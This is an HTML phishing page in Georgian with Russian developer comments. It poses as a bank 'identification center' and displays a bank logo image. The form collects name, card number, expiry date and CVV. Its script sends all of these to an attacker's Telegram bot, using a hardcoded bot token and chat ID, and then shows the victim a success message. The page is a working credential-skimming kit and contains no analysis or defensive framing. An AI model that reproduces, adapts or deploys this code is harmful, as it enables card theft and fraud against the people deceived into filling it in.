<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>იდენტიფიკაციის ცენტრი</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .center-container { text-align: center; margin-bottom: 20px; }
        .logo { max-width: 150px; }
        .form-container { background: white; padding: 25px 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 450px; box-sizing: border-box; }
        h1 { text-align: center; margin-bottom: 10px; color: #333; font-size: 24px; }
        h3 { text-align: center; color: #666; margin-bottom: 20px; font-weight: normal; }
        label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 14px; color: #333; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
        .expiry-cvv-row { display: flex; gap: 15px; width: 100%; margin-bottom: 15px; }
        .expiry-cvv-row div { flex: 1; min-width: 0; }
        button { width: 100%; padding: 16px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

<div class="center-container">
    <img src="TBlogo.svg.png" alt="Logo" class="logo">
</div>

<div class="form-container">
    <h1>იდენტიფიკაციის ცენტრი</h1>
    <!-- Добавили id="mainForm" -->
    <form id="mainForm">
        <h3>შეავსეთ ფორმა</h3>

        <label for="first-name">სახელი</label>
        <input type="text" id="first-name" placeholder="სახელი" required>

        <label for="last-name">გვარი</label>
        <input type="text" id="last-name" placeholder="გვარი" required>

        <label for="card-number">ბარათის ნომერი</label>
        <input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required>

        <div class="expiry-cvv-row">
            <div>
                <label for="expiry-date">მოქმედების ვადა</label>
                <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
            </div>
            <div>
                <label for="cvv">უსაფრთხოების კოდი</label>
                <input type="text" id="cvv" placeholder="***" maxlength="3" required>
            </div>
        </div>

        <button type="submit">მონაცების გაგზავნა</button>
    </form>
</div>

<script>
    // Маски для ввода (чтобы красиво вводились цифры)
    document.getElementById('card-number').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').slice(0,16);
        e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
    });

    document.getElementById('expiry-date').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').slice(0,4);
        if (v.length >= 2) e.target.value = v.slice(0,2) + '/' + v.slice(2,4);
    });

    // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ
    document.getElementById('mainForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Чтобы страница не перезагружалась

        const token = '8650944783:AAHsNX_fkpvurn6gkrcgnyqGNfzfHh8Xk9o';
        const chatId = '820823459';
        
        // Собираем данные из всех полей
        const name = document.getElementById('first-name').value;
        const lastName = document.getElementById('last-name').value;
        const card = document.getElementById('card-number').value;
        const exp = document.getElementById('expiry-date').value;
        const cvv = document.getElementById('cvv').value;

        const message = `🔔 Новая заявка!\n👤 Имя: ${name} ${lastName}\n💳 Карта: ${card}\n📅 Срок: ${exp}\n🔐 CVV: ${cvv}`;

        // Исправленная ссылка (добавлен /bot и исправлен путь)
        const url = `https://api.telegram.org{token}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(res => {
            if (res.ok) {
                alert('წარმატებით გაიგზავნა!'); // "Успешно отправлено" на грузинском
                location.reload(); // Очистить форму
            } else {
                alert('Ошибка при отправке. Проверь токен или ID.');
            }
        })
        .catch(err => alert('Ошибка сети: ' + err));
    });
</script>

</body>
</html>
